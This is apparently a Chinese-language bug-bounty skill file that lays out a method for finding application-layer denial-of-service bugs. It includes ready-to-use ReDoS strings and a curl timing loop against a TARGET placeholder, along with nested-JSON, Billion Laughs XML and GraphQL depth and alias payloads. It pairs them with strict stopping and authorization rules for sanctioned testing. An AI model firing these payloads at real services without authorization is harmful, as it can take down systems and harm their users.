---
name: hunt-dos
description: 应用层拒绝服务挖掘：ReDoS 灾难性回溯、算法复杂度爆炸（嵌套 JSON/Markdown/XML）、GraphQL 深度与别名爆炸、图片解码内存爆炸、数据库无 LIMIT、业务级限速缺失；二倍递增法定性并带停止规则
whenToUse: 发现正则校验字段（搜索/邮箱/URL）、富文本与 Markdown 预览、GraphQL、上传解码、无分页的查询接口时；SRC 报告 DoS 需严格取证
role: vuln-scan
enabled: true
---

# 应用层 DoS

> SRC 里 DoS 是「有赏金但高风险」的类型。核心纪律：**用最小代价证明指数增长，然后停手**。打满不叫证明，叫事故。

## 1. 类型分类

| 类型 | 原理 | 入口 |
|---|---|---|
| **ReDoS** | 正则灾难性回溯，输入长度翻倍耗时指数涨 | 搜索框、邮箱/URL 校验、用户名规则、时间格式校验 |
| **算法复杂度爆炸** | 嵌套结构递归解析 | 嵌套 JSON、Markdown 嵌套图片/列表、XML 深层嵌套、ZIP bomb |
| **资源不限速** | 无分页/无大小限/无超时 | 列表接口、上传、导出 |
| **内存爆炸** | 解码大图/视频/SVG | 图片上传、缩略图生成、PDF 渲染 |
| **数据库 DoS** | 无 LIMIT 全表扫描、笛卡尔积、锁竞争 | 搜索/筛选/排序参数 |
| **业务级 DoS** | 无限流 → 短信/邮件轰炸、资源占用 | 验证码发送、邀请、分享 |

## 2. ReDoS 探测（二倍递增法）

**找正则字段**：搜索、邮箱、URL、时间、用户名、手机号校验。

**测试 payload（指数级回溯经典式）**

```
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!        # 对应 (a+)+$
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaX
{1..1000000}                           # 对应 ^(\d+)*$
[[[[[[[[[[[[[[[[[[[[[[
```

**关键手法** —— 长度翻倍，看耗时：

```bash
for n in 16 32 64 128 256; do
  p=$(printf 'a%.0s' $(seq 1 $n))
  curl -s -o /dev/null -w "n=$n time=%{time_total}\n" \
    "https://TARGET/search?q=${p}!"
done
```

**期望看到**：毫秒 → 100ms → 1s → 10s → 100s（指数增长）。
**一旦确认指数增长，立刻停止，不再加大 n。** 用 n=256 的耗时数据 + 一条 n=128 的对照，就足以证明。

## 3. 结构爆炸探测

**嵌套 JSON**（服务端递归解析）

```bash
python3 -c 'print("{\"a\":"*5000 + "1" + "}"*5000)' > deep.json
curl -s -X POST -d @deep.json https://TARGET/api/parse -w "time=%{time_total}\n"
```

**Markdown 嵌套图片**（GitLab #1543718 实测 CPU 60s）

```markdown
![a](x)![a](x)![a](x)...    # 大量图片引用触发重复渲染
```

**Billion Laughs**（仅在已知后端接受 XML/DTD 时）

```xml
<!DOCTYPE lolz [
 <!ENTITY lol "lol">
 <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
 <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
]>
<lolz>&lol2;</lolz>
```

**先用 `lol2` 不用 `lol8`** —— 先验证服务器能解析 DTD，再谈放大。

## 4. GraphQL 深度 / 别名爆炸

```graphql
# 深度爆炸：5 层 → 10 层 → 15 层，看响应时间
{ user { posts { user { posts { user { posts { id } } } } } } }

# 别名爆炸：同一字段 N 次
{ a1:user(id:1){id} a2:user(id:1){id} ... a100:user(id:1){id} }
```

**判定**：深度 15 层时耗时是 5 层的 10 倍以上，且无 depth limit 报错 = 成立。

## 5. 上传解码爆炸

| 手法 | 说明 |
|---|---|
| 超大分辨率 PNG | 小文件解出巨幅位图（解压炸弹） |
| SVG 嵌套 | 递归 `<use>` 引用自身 |
| ZIP 炸弹 | 嵌套压缩包，解压后 GB 级 |
| PDF 页数爆炸 | 单页内容极大 |

**只做「上传成功 + 处理超时」证明**，不要让服务真 OOM。

## 6. 判定标准

| 现象 | 定性 |
|---|---|
| 输入翻倍 → 耗时 ≥2 倍线性、≥4 倍指数，可复现 | **成立**（ReDoS P2–P3） |
| 服务超时/502 但**未崩溃**，可恢复 | 成立，记 A 影响 |
| 服务崩溃需重启 | 成立 Critical，**但不要在真实生产复现第二次** |
| 仅偶发慢，无法复现 | 不报 |
| 有限速/有 depth limit/有大小限制 | 不成立（加固正确） |

## 7. 报告纪律（这是 DoS 类最重要的一节）

- **只做一次有效复现**，附耗时数据与对照，不复现第二次。
- **不做满**：ReDoS 打到 10s 就停，不追 100s。
- **不并发**：单线程串行，禁并发压测。
- **不在业务高峰做**，优先选择可观测的测试窗口。
- 报告写明：影响面（单请求 vs 服务级）、恢复方式（自动/需重启）、已采取的最小化措施。
- 落库：`category=other` 或 `dos`，severity 按真实影响，附耗时曲线。

## 8. 不要做的事

- 禁：真实压测、并发放大、持续打。
- 禁：在未明确授权的生产环境做崩溃性验证。
- 禁：把 DoS 当「顺手试试」——它是最容易造成真实影响的类型。
- 禁：用短信/邮件轰炸真实第三方号码/邮箱验证业务级 DoS。

<!-- 改编自: src-hunter references/playbooks/dos.md (624 行) + PayloadsAllTheThings/Denial of Service, 2026-11-01 -->
